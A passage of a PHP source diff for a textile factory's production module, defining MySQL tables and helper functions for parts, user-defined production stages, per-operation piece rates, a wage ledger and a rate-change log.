@@ -1,0 +1,2451 @@
+<?php
+/*
+  ZAS PRODUCTION — REBUILT FROM SCRATCH.
+  ======================================
+
+  Asked for after two days lost to the old module. This replaces the production
+  and part screens only. Costing, invoicing, shipments, inventory and everything
+  else in the app are untouched and do not know this file exists.
+
+  THREE RULES THIS FILE IS BUILT ON
+  ---------------------------------
+
+  1. THE MASTER PRODUCT TABLE IS NOT TOUCHED. `products` is read, never
+     dropped, never emptied. Your 26 products stay exactly where they are.
+
+  2. NEW TABLES, NOT REUSED ONES. Every table here is prefixed `zp_`. The old
+     production_* and part_library_* tables are left on disk, untouched. That
+     means this rebuild starts genuinely empty — no half-migrated rows, no old
+     rates leaking in — and if anything is ever needed back from the old data,
+     it is still there to read. A rebuild that overwrites the thing it replaces
+     cannot be undone; this one can.
+
+  3. THREE STAGES, AND NO PACKING. Cutting, Manual Cutting, Stitching. Dispatch
+     is gone, as asked. Manual Cutting is a second cutting line for the special
+     case in your layout — it is a real stage, not a label, so its wage is
+     counted separately and you can see what hand cutting is costing you.
+
+  Every CREATE is `IF NOT EXISTS` and every ALTER is wrapped, so this file can
+  run on every page load forever without ever doing damage.
+*/
+
+function zp_ensure_schema(): void {
+    static $done = false;
+    if ($done) return;
+    $done = true;
+
+    /* ---- THE PRODUCTS TABLE IS READ, NEVER CREATED AND NEVER EMPTIED.
+       The only thing done to it is making sure the two columns the CSV round
+       trip needs actually exist. Both are additive and nullable, so on a
+       database that already has them this does nothing at all. If `products`
+       itself were missing, that is a far bigger problem than this module and
+       must not be papered over by quietly creating an empty one. */
+    try { db()->exec("ALTER TABLE products ADD COLUMN description VARCHAR(255) NULL AFTER name"); } catch (Throwable $e) {}
+    try { db()->exec("ALTER TABLE products ADD COLUMN fcl_40hc_qty DECIMAL(12,2) NULL DEFAULT 0"); } catch (Throwable $e) {}
+
+    /* ---- the parts you make: Bed Sheet, Pillow Cover, Packing Bag ---- */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_parts (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        part_name VARCHAR(120) NOT NULL,
+        uom VARCHAR(20) NOT NULL DEFAULT 'Pc',
+        style VARCHAR(80) NULL,
+        is_active TINYINT(1) NOT NULL DEFAULT 1,
+        created_by INT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        updated_at DATETIME NULL,
+        UNIQUE KEY uniq_part_name (part_name),
+        INDEX(is_active)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+
+    /* ---- what is done to a part, in order, and what each step pays ----
+       seq keeps the order you typed. stage is one of zp_stages().
+       A part's FIRST row is always its Cutting row — see zp_save_part_ops(). */
+    /* ---- THE STAGES, typed by you, in the order work reaches them ----
+       SEEDED EXACTLY ONCE, and only on the very first run. The check is made
+       BEFORE the CREATE, because CREATE IF NOT EXISTS cannot tell you whether
+       it built the table or found it. Seeding on "empty" instead would bring
+       two stages back from the dead every time somebody cleared the list, and
+       that is the kind of thing that makes an app feel haunted. */
+    $stageTableExisted = false;
+    try { db()->query("SELECT 1 FROM zp_stage LIMIT 1"); $stageTableExisted = true; } catch (Throwable $e) {}
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_stage (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        seq INT NOT NULL DEFAULT 0,
+        name VARCHAR(60) NOT NULL,
+        is_active TINYINT(1) NOT NULL DEFAULT 1,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        UNIQUE KEY uniq_stage_name (name),
+        INDEX(seq)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+    if (!$stageTableExisted) {
+        try {
+            $s = db()->prepare("INSERT INTO zp_stage (seq, name) VALUES (?,?)");
+            $s->execute([1, 'Cutting']);
+            $s->execute([2, 'Stitching']);
+        } catch (Throwable $e) {}
+    }
+
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_part_ops (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        part_id INT NOT NULL,
+        seq INT NOT NULL DEFAULT 0,
+        stage VARCHAR(60) NULL DEFAULT NULL,
+        operation_name VARCHAR(120) NOT NULL,
+        rate DECIMAL(12,2) NOT NULL DEFAULT 0,
+        is_active TINYINT(1) NOT NULL DEFAULT 1,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        INDEX(part_id), INDEX(stage)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+    /* THE STAGE IS HELD BY ID, NOT BY ITS SPELLING — that is what makes
+       renaming a stage safe. The older `stage` text column is still written
+       alongside it so the screens not yet converted keep reading; the id is
+       what every rule is decided on. */
+    try { db()->exec("ALTER TABLE zp_part_ops ADD COLUMN stage_id INT NULL DEFAULT NULL AFTER part_id"); } catch (Throwable $e) {}
+    /* WIDENED FROM VARCHAR(20), AND THAT WAS A REAL BUG WAITING.
+       A stage name may be 60 characters. Written into a 20-character column,
+       "Second Stitching Line Overlock" would have been CUT SHORT — silently in
+       loose mode, and the shortened text then matches no stage at all. It is the
+       same silent-truncation failure as the old ENUM, one column along. The
+       default is dropped with it: a row's stage comes from stage_id, and a
+       column that quietly fills itself in with a stage name is not a default,
+       it is a guess. */
+    try { db()->exec("ALTER TABLE zp_part_ops MODIFY stage VARCHAR(60) NULL DEFAULT NULL"); } catch (Throwable $e) {}
+    try { db()->exec("CREATE INDEX idx_zpo_stage ON zp_part_ops (stage_id)"); } catch (Throwable $e) {}
+
+    /* ---- THE SHARED SIZE LIST lives in product_sizes, which Costing, Proforma
+       and fourteen other files already read. Two columns are added to it, both
+       nullable, so no existing row anywhere can be rejected:
+         sort_order         so Product Master can order the list
+         product_size_id    on proforma_items, so an order line REMEMBERS which
+                            size it is instead of being matched back by text ---- */
+    try { db()->exec("ALTER TABLE product_sizes ADD COLUMN sort_order INT NOT NULL DEFAULT 0"); } catch (Throwable $e) {}
+    try { db()->exec("ALTER TABLE proforma_items ADD COLUMN product_size_id INT NULL DEFAULT NULL"); } catch (Throwable $e) {}
+    try { db()->exec("CREATE INDEX idx_pi_size ON proforma_items (product_size_id)"); } catch (Throwable $e) {}
+
+    /* ---- the OLD production-only size table. Nothing reads it any more; it is
+       kept on disk untouched because it is the only record of what was typed
+       before the two lists were merged. ---- */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_sizes (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        product_id INT NOT NULL,
+        size_label VARCHAR(60) NOT NULL,
+        sort_order INT NOT NULL DEFAULT 0,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        UNIQUE KEY uniq_product_size (product_id, size_label),
+        INDEX(product_id)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+
+    /* ---- which parts go into a product ---- */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_product_parts (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        product_id INT NOT NULL,
+        part_id INT NOT NULL,
+        sort_order INT NOT NULL DEFAULT 0,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        UNIQUE KEY uniq_product_part (product_id, part_id),
+        INDEX(product_id)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+
+    /* ---- HOW MANY of that part go into ONE set, per size.
+       This is the grid in your layout: Double pillow = 2, Sheet = 1.
+       A missing row means 1, not 0 — see zp_qty_map(). A part that is in the
+       product is in it at least once; storing that as a blank would make a
+       product silently produce nothing. */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_part_qty (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        product_id INT NOT NULL,
+        part_id INT NOT NULL,
+        size_id INT NOT NULL,
+        qty DECIMAL(10,2) NOT NULL DEFAULT 1,
+        UNIQUE KEY uniq_ppq (product_id, part_id, size_id),
+        INDEX(product_id)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+
+    /* ---- A RATE THAT IS DIFFERENT FOR ONE SIZE ----
+       Deliberately the SAME SHAPE as zp_part_qty above: product + thing + size,
+       and NO ROW MEANS THE DEFAULT. There, the default is 1 per set; here it is
+       the operation's own rate on zp_part_ops. An empty table therefore behaves
+       exactly as the app did before this existed, which is what makes adding it
+       safe.
+
+       WHY THE KEY CARRIES product_id WHEN part_op_id ALREADY IMPLIES A PART.
+       A part is a shared library row — zp_parts.part_name is UNIQUE, so "Flat
+       Sheet" is ONE row used by every product that has one. Its rate is shared
+       on purpose. A SIZE, though, belongs to exactly one product, so keying on
+       the size alone would already scope this to a product. product_id is
+       carried anyway so "what has this product overridden?" needs no join and
+       cleanup is one DELETE — the same reasons zp_part_qty carries it.
+
+       A King flat sheet has more running metres of seam than a Single, so it
+       genuinely costs more to overlock. That is the case this exists for; it
+       is NOT for pieces-per-set, which zp_part_qty already handles. */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_op_rate (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        product_id INT NOT NULL,
+        part_op_id INT NOT NULL,
+        size_id INT NOT NULL,
+        rate DECIMAL(12,2) NOT NULL,
+        created_by INT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        updated_at DATETIME NULL,
+        UNIQUE KEY uniq_por (product_id, part_op_id, size_id),
+        INDEX(product_id), INDEX(size_id)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+
+    /* ---- the people on the machines ---- */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_workers (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        worker_code VARCHAR(20) NOT NULL,
+        worker_name VARCHAR(120) NOT NULL,
+        department VARCHAR(60) NULL,
+        is_active TINYINT(1) NOT NULL DEFAULT 1,
+        created_by INT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        UNIQUE KEY uniq_worker_code (worker_code),
+        INDEX(worker_name)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+
+    /* ---- the wage ledger ----
+       rate_applied IS A SNAPSHOT AND IS NEVER RECALCULATED. The rate that was
+       in force the moment this was booked is frozen onto the row. Change a rate
+       tomorrow and every wage already paid stays exactly as it was paid. This
+       single column is what makes the rate history safe to edit.
+
+       status: 'active' or 'cancelled'. NOTHING IS EVER DELETED from this
+       table — a cancelled entry keeps its row so the correction is visible. */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_entries (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        entry_date DATE NOT NULL,
+        worker_id INT NOT NULL,
+        proforma_id INT NULL,
+        proforma_item_id INT NULL,
+        product_id INT NOT NULL,
+        part_id INT NULL,
+        op_id INT NOT NULL,
+        stage_id INT NULL,
+        stage VARCHAR(60) NULL,
+        qty DECIMAL(12,2) NOT NULL,
+        rate_applied DECIMAL(12,2) NOT NULL,
+        amount DECIMAL(14,2) NOT NULL,
+        status VARCHAR(12) NOT NULL DEFAULT 'active',
+        note VARCHAR(255) NULL,
+        created_by INT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        cancelled_by INT NULL,
+        cancelled_at DATETIME NULL,
+        cancel_reason VARCHAR(255) NULL,
+        INDEX(entry_date), INDEX(worker_id), INDEX(product_id),
+        INDEX(op_id), INDEX(status), INDEX(proforma_item_id)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+    /* THE WAGE LEDGER CARRIES THE STAGE BY ID TOO, and for the same reason as
+       the operations: a paid wage must still know which stage it was paid for
+       after that stage is renamed. The text column beside it was VARCHAR(20),
+       which would have quietly cut any stage name longer than twenty letters
+       and left the wage filed under a stage that matches nothing. */
+    try { db()->exec("ALTER TABLE zp_entries ADD COLUMN stage_id INT NULL DEFAULT NULL AFTER op_id"); } catch (Throwable $e) {}
+    try { db()->exec("ALTER TABLE zp_entries MODIFY stage VARCHAR(60) NULL DEFAULT NULL"); } catch (Throwable $e) {}
+    try { db()->exec("CREATE INDEX idx_zpe_stage ON zp_entries (stage_id)"); } catch (Throwable $e) {}
+
+    /* ---- one order pays a different rate for one operation ---- */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_order_rates (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        proforma_id INT NOT NULL,
+        op_id INT NOT NULL,
+        rate DECIMAL(12,2) NOT NULL,
+        reason VARCHAR(255) NOT NULL,
+        created_by INT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        UNIQUE KEY uniq_order_op (proforma_id, op_id)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+
+    /* ---- every rate that ever moved, and who moved it ---- */
+    try { db()->exec("CREATE TABLE IF NOT EXISTS zp_rate_log (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        op_id INT NULL,
+        proforma_id INT NULL,
+        part_name VARCHAR(120) NULL,
+        operation_name VARCHAR(120) NULL,
+        old_rate DECIMAL(12,2) NULL,
+        new_rate DECIMAL(12,2) NOT NULL,
+        reason VARCHAR(255) NULL,
+        user_id INT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        INDEX(op_id), INDEX(created_at)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Throwable $e) {}
+}
+
+/* ============================================================
+   STAGES
+   ============================================================
+
+   Three, and no packing step. Cutting is where a part starts and is what sets
+   its production limit. Manual Cutting is the second cutting line from your
+   layout — hand cutting for the odd shape — kept as its OWN stage rather than
+   a second row called "Cutting", so that at the end of the month you can see
+   what hand cutting cost you without unpicking it from machine cutting.
+   Stitching is everything after. */
+/* ============================================================
+   STAGES — YOUR WORDS, YOUR ORDER
+   ============================================================
+
+   These used to be three words written into this line: Cutting, Manual Cutting,
+   Stitching. That was the mistake behind most of the trouble — the factory
+   works how it works, and every time it did not match, the code had to change.
+   Worse, the old costing table only ever accepted three specific words, so a
+   fourth was thrown away without an error.
+
+   Now you type them, on the Production Stages screen, and they live in zp_stage.
+
+   POSITION CARRIES THE ONLY RULE. The stage at the top makes the pieces — not
+   because of what it is called, but because it is first. It is limited by the
+   order quantity. Everything below it can only be booked on pieces that already
+   exist, which is what stops 500 being stitched when 300 were cut.
+
+   Names carry no rule at all, so renaming one never moves a wage: work is
+   booked against the stage's id, never against its spelling. */
+
+function zp_stage_all(bool $activeOnly = false): array {
+    zp_ensure_schema();
+    static $cache = [];
+    $k = $activeOnly ? 'on' : 'all';
+    if (isset($cache[$k])) return $cache[$k];
+    $sql = "SELECT * FROM zp_stage" . ($activeOnly ? " WHERE is_active=1" : "") . " ORDER BY seq, id";
+    try { $cache[$k] = db()->query($sql)->fetchAll(); } catch (Throwable $e) { $cache[$k] = []; }
+    return $cache[$k];
+}
+
+/* THE STAGE THAT MAKES THE PIECES = the first ACTIVE one.
+   Active matters: a stage switched off is not part of the flow any more, and
+   treating a dead row as the piece-maker would cap every later stage at zero. */
+function zp_stage_first(): ?array {
+    $on = zp_stage_all(true);
+    return $on ? $on[0] : null;
+}
+function zp_stage_first_id(): int { $f = zp_stage_first(); return $f ? (int)$f['id'] : 0; }
+function zp_stage_is_first(int $stageId): bool { return $stageId > 0 && $stageId === zp_stage_first_id(); }
+
+function zp_stage_by_id(int $id): ?array {
+    foreach (zp_stage_all() as $s) if ((int)$s['id'] === $id) return $s;
+    return null;
+}
+/* A STAGE THAT WAS DELETED STILL HAS TO PRINT SOMETHING. Returning '' would
+   make a paid wage look like it belonged to no stage at all. */
+function zp_stage_name(int $id): string {
+    $s = zp_stage_by_id($id);
+    return $s ? (string)$s['name'] : '(removed stage)';
+}
+
+/* THE STAGE BEFORE THIS ONE — the thing that limits it.
+   Null for the first stage, which is limited by the order instead. */
+function zp_stage_prev(int $stageId): ?array {
+    $on = zp_stage_all(true);
+    foreach ($on as $i => $s) if ((int)$s['id'] === $stageId) return $i > 0 ? $on[$i - 1] : null;
+    return null;
+}
+
+/* ---- the screens that have not been converted yet still speak in names ----
+   These two keep every unconverted screen correct under the new model without
+   editing it: the dropdowns now list YOUR stages, and "is this the one that
+   makes the pieces" is answered by position instead of by the word 'Cutting'. */
+function zp_stages(): array { return array_column(zp_stage_all(true), 'name'); }
+
+function zp_is_cutting(string $stage): bool {
+    $f = zp_stage_first();
+    return $f !== null && mb_strtolower(trim($stage)) === mb_strtolower((string)$f['name']);
+}
+
+/* An unknown stage name snaps to the SECOND stage, not the first. Guessing the
+   first would quietly hand a row the power to create pieces. */
+function zp_stage_clean(?string $s): string {
+    $s = trim((string)$s);
+    $on = zp_stage_all(true);
+    foreach ($on as $r) if (mb_strtolower($r['name']) === mb_strtolower($s)) return (string)$r['name'];
+    if (isset($on[1])) return (string)$on[1]['name'];
+    return $on ? (string)$on[0]['name'] : '';
+}
+
+/* The id behind a typed or posted stage name — '' when it matches nothing, so
+   a caller must decide, rather than being handed a silent default. */
+function zp_stage_id_for(?string $name): int {
+    $name = mb_strtolower(trim((string)$name));
+    if ($name === '') return 0;
+    foreach (zp_stage_all() as $s) if (mb_strtolower($s['name']) === $name) return (int)$s['id'];
+    return 0;
+}
+
+/* ============================================================
+   PART CODES — P001, P002, ...
+   ============================================================
+
+   The code is DERIVED from the id, never stored. A stored code is one more
+   thing to keep unique, to renumber, and to get wrong; the id is already
+   unique and already permanent. P001 is simply how id 1 is written down. */
+function zp_part_code(int $id): string { return 'P' . str_pad((string)$id, 3, '0', STR_PAD_LEFT); }
+
+/* Accepts P001, p1, #1 or 1 — because people type all four. */
+function zp_part_id_from(string $s): int {
+    $s = trim($s);
+    if ($s === '') return 0;
+    if (preg_match('/^[Pp#]?0*(\d+)$/', $s, $m)) return (int)$m[1];
+    return 0;
+}
+
+/* ============================================================
+   PARTS
+   ============================================================ */
+
+function zp_parts(bool $activeOnly = false): array {
+    zp_ensure_schema();
+    $sql = "SELECT * FROM zp_parts" . ($activeOnly ? " WHERE is_active=1" : "") . " ORDER BY id";
+    try { return db()->query($sql)->fetchAll(); } catch (Throwable $e) { return []; }
+}
+
+function zp_part(int $id): ?array {
+    if ($id <= 0) return null;
+    zp_ensure_schema();
+    $st = db()->prepare("SELECT * FROM zp_parts WHERE id=?");
+    $st->execute([$id]);
+    $r = $st->fetch();
+    return $r ?: null;
+}
+
+/* Returns [ok, id, error]. A duplicate NAME is refused rather than silently
+   creating a second "Bed Sheet" that half your products point at. */
+function zp_save_part(int $id, string $name, string $uom, ?string $style, int $active, ?int $userId = null): array {
+    zp_ensure_schema();
+    $name = trim($name);
+    $uom  = trim($uom) !== '' ? trim($uom) : 'Pc';
+    $style = ($style === null || trim($style) === '') ? null : trim($style);
+    if ($name === '') return ['ok' => false, 'id' => 0, 'error' => 'Part name is required.'];
+
+    $dup = db()->prepare("SELECT id FROM zp_parts WHERE part_name=? AND id<>?");
+    $dup->execute([$name, $id]);
+    if ($dup->fetchColumn()) {
+        return ['ok' => false, 'id' => 0, 'error' => 'A part called "' . $name . '" already exists. Open that one instead of making a second.'];
+    }
+
+    if ($id > 0) {
+        db()->prepare("UPDATE zp_parts SET part_name=?, uom=?, style=?, is_active=?, updated_at=NOW() WHERE id=?")
+            ->execute([$name, $uom, $style, $active ? 1 : 0, $id]);
+        return ['ok' => true, 'id' => $id, 'error' => ''];
+    }
+    db()->prepare("INSERT INTO zp_parts (part_name, uom, style, is_active, created_by) VALUES (?,?,?,?,?)")
+        ->execute([$name, $uom, $style, $active ? 1 : 0, $userId]);
+    return ['ok' => true, 'id' => (int)db()->lastInsertId(), 'error' => ''];
+}
+
+/* A part that is used by a product is DEACTIVATED, never deleted — deleting it
+   would leave that product pointing at nothing and its wages orphaned. The
+   caller is told which it was so the screen can say so. */
+function zp_delete_part(int $id): array {
+    zp_ensure_schema();
+    $used = db()->prepare("SELECT COUNT(*) FROM zp_product_parts WHERE part_id=?");
+    $used->execute([$id]);
+    $booked = db()->prepare("SELECT COUNT(*) FROM zp_entries WHERE part_id=? AND status='active'");
+    $booked->execute([$id]);
+    if ((int)$used->fetchColumn() > 0 || (int)$booked->fetchColumn() > 0) {
+        db()->prepare("UPDATE zp_parts SET is_active=0, updated_at=NOW() WHERE id=?")->execute([$id]);
+        return ['ok' => true, 'deleted' => false,
+                'msg' => 'That part is in use, so it has been deactivated instead of deleted. Nothing that points at it was harmed.'];
+    }
+    db()->prepare("DELETE FROM zp_part_ops WHERE part_id=?")->execute([$id]);
+    db()->prepare("DELETE FROM zp_parts WHERE id=?")->execute([$id]);
+    return ['ok' => true, 'deleted' => true, 'msg' => 'Part deleted.'];
+}
+
+function zp_duplicate_part(int $id, ?int $userId = null): array {
+    zp_ensure_schema();
+    $src = zp_part($id);
+    if (!$src) return ['ok' => false, 'id' => 0, 'error' => 'That part no longer exists.'];
+
+    /* "Bed Sheet" -> "Bed Sheet (Copy)" -> "Bed Sheet (Copy 2)" ... */
+    $base = $src['part_name'] . ' (Copy';
+    $name = $base . ')'; $n = 2;
+    while (true) {
+        $c = db()->prepare("SELECT COUNT(*) FROM zp_parts WHERE part_name=?");
+        $c->execute([$name]);
+        if (!(int)$c->fetchColumn()) break;
+        $name = $base . ' ' . $n . ')'; $n++;
+        if ($n > 60) return ['ok' => false, 'id' => 0, 'error' => 'Too many copies of that part already.'];
+    }
+
+    db()->prepare("INSERT INTO zp_parts (part_name, uom, style, is_active, created_by) VALUES (?,?,?,1,?)")
+        ->execute([$name, $src['uom'], $src['style'], $userId]);
+    $newId = (int)db()->lastInsertId();
+
+    /* the operations come with it — a copy with no operations is not a copy */
+    $ops = db()->prepare("SELECT seq, stage, operation_name, rate, is_active FROM zp_part_ops WHERE part_id=? ORDER BY seq, id");
+    $ops->execute([$id]);
+    $ins = db()->prepare("INSERT INTO zp_part_ops (part_id, seq, stage, operation_name, rate, is_active) VALUES (?,?,?,?,?,?)");
+    foreach ($ops->fetchAll() as $o) {
+        $ins->execute([$newId, (int)$o['seq'], $o['stage'], $o['operation_name'], $o['rate'], (int)$o['is_active']]);
+    }
+    return ['ok' => true, 'id' => $newId, 'error' => ''];
+}
+
+/* ============================================================
+   PART OPERATIONS
+   ============================================================ */
+
+function zp_part_ops(int $partId, bool $activeOnly = false): array {
+    if ($partId <= 0) return [];
+    zp_ensure_schema();
+    $sql = "SELECT * FROM zp_part_ops WHERE part_id=?" . ($activeOnly ? " AND is_active=1" : "") . " ORDER BY seq, id";
+    $st = db()->prepare($sql);
+    $st->execute([$partId]);
+    return $st->fetchAll();
+}
+
+/* Save the whole grid for one part in one go.
+ *
+ * $rows = [ ['id'=>int, 'stage'=>string, 'name'=>string, 'rate'=>float], ... ]
+ * in the order shown on screen.
+ *
+ * WHY THE WHOLE GRID AND NOT ROW BY ROW: the order of the rows IS information
+ * (it is the order the work happens in), and a row-at-a-time save cannot
+ * express "row 3 moved above row 2". Replacing the set in one transaction also
+ * means a half-saved grid is impossible.
+ *
+ * A row whose operation has WAGES BOOKED AGAINST IT is never deleted — it is
+ * deactivated, so the wage keeps its operation name on every report.
+ */
+function zp_save_part_ops(int $partId, array $rows, string $reason = '', ?int $userId = null): array {
+    zp_ensure_schema();
+    if ($partId <= 0) return ['ok' => false, 'error' => 'No part selected.'];
+    $part = zp_part($partId);
+    if (!$part) return ['ok' => false, 'error' => 'That part no longer exists.'];
+
+    /* NOTHING CAN BE PRICED UNTIL THE STAGES EXIST. Saving into an empty stage
+       list would leave every operation belonging to no stage, and no report
+       could ever say what it was. */
+    $stageRows = zp_stage_all(true);
+    if (!$stageRows)
+        return ['ok' => false, 'error' => 'Set up your production stages first — an operation has to belong to one.'];
+    $firstStage = $stageRows[0];
+
+    /* ---- check everything BEFORE writing anything ---- */
+    $clean = []; $seq = 0;
+    foreach ($rows as $i => $r) {
+        $name = trim((string)($r['name'] ?? ''));
+        /* the id is what counts; the posted name is only a fallback for a form
+           that has not been converted to send ids yet */
+        $sid  = (int)($r['stage_id'] ?? 0);
+        if ($sid <= 0) $sid = zp_stage_id_for((string)($r['stage'] ?? ''));
+        $rate = (float)str_replace(',', '', (string)($r['rate'] ?? 0));
+        $rid  = (int)($r['id'] ?? 0);
+        if ($name === '' && $rate <= 0) continue;                 // an untouched blank row
+        if ($name === '')  return ['ok' => false, 'error' => 'Line ' . ($i + 1) . ' has a rate but no operation name.'];
+        if ($rate <= 0)    return ['ok' => false, 'error' => 'Line ' . ($i + 1) . ' ("' . $name . '") needs a rate above 0.'];
+        if ($sid <= 0 || !zp_stage_by_id($sid))
+            return ['ok' => false, 'error' => 'Line ' . ($i + 1) . ' ("' . $name . '") has no stage. Pick one from the list.'];
+        $clean[] = ['id' => $rid, 'seq' => $seq++, 'stage_id' => $sid,
+                    'stage' => zp_stage_name($sid), 'name' => $name, 'rate' => round($rate, 2)];
+    }
+    if (!$clean) return ['ok' => false, 'error' => 'Add at least one operation before saving.'];
+
+    /* THE FIRST LINE IS THE FIRST STAGE. Not because of what it is called —
+       because the first stage is what makes the pieces, and every stage after
+       it is capped by what already exists. A part whose first line sat at a
+       later stage would have no ceiling at all. */
+    if ((int)$clean[0]['stage_id'] !== (int)$firstStage['id']) {
+        return ['ok' => false, 'error' => 'The first line must be "' . $firstStage['name']
+              . '" — it is the stage that makes the pieces, so everything else is limited by it.'];
+    }
+
+    /* two lines with the same name at the same stage would double-count */
+    $seen = [];
+    foreach ($clean as $c) {
+        $k = $c['stage_id'] . '|' . mb_strtolower($c['name']);
+        if (isset($seen[$k])) return ['ok' => false, 'error' => 'Two lines both say "' . $c['name'] . '" at ' . $c['stage'] . '. Rename one, or delete it.'];
+        $seen[$k] = true;
+    }
+
+    $existing = [];
+    foreach (zp_part_ops($partId) as $o) $existing[(int)$o['id']] = $o;
+
+    db()->beginTransaction();
+    try {
+        $keep = [];
+        /* stage_id decides every rule; the stage NAME is written beside it only
+           so the screens not yet converted keep reading. Both come from the same
+           row, so they can never disagree. */
+        $upd = db()->prepare("UPDATE zp_part_ops SET seq=?, stage_id=?, stage=?, operation_name=?, rate=?, is_active=1 WHERE id=? AND part_id=?");
+        $ins = db()->prepare("INSERT INTO zp_part_ops (part_id, seq, stage_id, stage, operation_name, rate, is_active) VALUES (?,?,?,?,?,?,1)");
+        foreach ($clean as $c) {
+            if ($c['id'] > 0 && isset($existing[$c['id']])) {
+                $old = (float)$existing[$c['id']]['rate'];
+                $upd->execute([$c['seq'], $c['stage_id'], $c['stage'], $c['name'], $c['rate'], $c['id'], $partId]);
+                if (abs($old - $c['rate']) > 0.004) {
+                    zp_rate_log($c['id'], null, $part['part_name'], $c['name'], $old, $c['rate'], $reason, $userId);
+                }
+                $keep[] = $c['id'];
+            } else {
+                $ins->execute([$partId, $c['seq'], $c['stage_id'], $c['stage'], $c['name'], $c['rate']]);
+                $newId = (int)db()->lastInsertId();
+                zp_rate_log($newId, null, $part['part_name'], $c['name'], null, $c['rate'], $reason, $userId);
+                $keep[] = $newId;
+            }
+        }
+
+        /* rows the user removed from the grid */
+        foreach ($existing as $oid => $o) {
+            if (in_array($oid, $keep, true)) continue;
+            $booked = db()->prepare("SELECT COUNT(*) FROM zp_entries WHERE op_id=? AND status='active'");
+            $booked->execute([$oid]);
+            if ((int)$booked->fetchColumn() > 0) {
+                db()->prepare("UPDATE zp_part_ops SET is_active=0 WHERE id=?")->execute([$oid]);
+            } else {
+                db()->prepare("DELETE FROM zp_part_ops WHERE id=?")->execute([$oid]);
+            }
+        }
+        db()->commit();
+    } catch (Throwable $e) {
+        db()->rollBack();
+        return ['ok' => false, 'error' => 'Nothing was saved — the database refused the change. ' . $e->getMessage()];
+    }
+    return ['ok' => true, 'error' => ''];
+}
+
+function zp_rate_log(?int $opId, ?int $proformaId, ?string $partName, ?string $opName,
+                     ?float $old, float $new, string $reason = '', ?int $userId = null): void {
+    zp_ensure_schema();
+    try {
+        db()->prepare("INSERT INTO zp_rate_log (op_id, proforma_id, part_name, operation_name, old_rate, new_rate, reason, user_id)
+                       VALUES (?,?,?,?,?,?,?,?)")
+            ->execute([$opId, $proformaId, $partName, $opName, $old, $new, mb_substr(trim($reason), 0, 255), $userId]);
+    } catch (Throwable $e) {}
+}
+
+/* THE RATE HISTORY, SCOPED.
+ *
+ * With no order given this is the whole log — the right thing when nobody has
+ * picked an order yet.
+ *
+ * With an order given it answers only "what has moved that concerns THIS
+ * order", which is two things and no more:
+ *   - amendments made on this order itself, and
+ *   - standard-rate changes to the operations this order actually uses.
+ * A rate somebody amended on another customer's PO is not this order's
+ * business and is not shown here. */
+function zp_rate_log_read(int $limit = 200, ?int $proformaId = null, array $opIds = []): array {
+    zp_ensure_schema();
+    try {
+        if ($proformaId === null || $proformaId <= 0) {
+            return db()->query("SELECT * FROM zp_rate_log ORDER BY id DESC LIMIT " . (int)$limit)->fetchAll();
+        }
+        $ids = array_values(array_unique(array_map('intval', $opIds)));
+        $where = "proforma_id = ?";
+        $args  = [$proformaId];
+        if ($ids) {
+            $where .= " OR (proforma_id IS NULL AND op_id IN (" . implode(',', array_fill(0, count($ids), '?')) . "))";
+            $args = array_merge($args, $ids);
+        }
+        $st = db()->prepare("SELECT * FROM zp_rate_log WHERE $where ORDER BY id DESC LIMIT " . (int)$limit);
+        $st->execute($args);
+        return $st->fetchAll();
+    } catch (Throwable $e) { return []; }
+}
+
+/* The cost of making ONE of this part = every active operation added up.
+   This is the only place that total is worked out, so the Part Library, the
+   Product Master and the reports can never disagree about it. */
+function zp_part_cost(int $partId): float {
+    $t = 0.0;
+    foreach (zp_part_ops($partId, true) as $o) $t += (float)$o['rate'];
+    return round($t, 2);
+}
+
